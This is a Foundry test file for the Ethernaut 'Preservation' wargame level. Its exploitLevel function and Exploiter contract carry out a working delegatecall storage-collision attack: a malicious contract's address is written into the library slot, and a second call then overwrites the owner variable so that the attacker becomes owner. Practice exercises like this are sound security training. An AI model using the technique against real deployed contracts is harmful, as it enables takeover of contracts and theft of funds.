// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Preservation.sol";
import "src/levels/PreservationFactory.sol";

contract TestPreservation is BaseTest {
    Preservation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PreservationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        Exploiter expContract = new Exploiter();
        level.setFirstTime(uint256(address(expContract)));
        console.log("new Addr: %s", level.timeZone1Library());
        level.setFirstTime(uint256(address(player)));
        vm.stopPrank();

        assertEq(level.owner(), player);
    }
}

contract Exploiter {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(_time);
    }
}
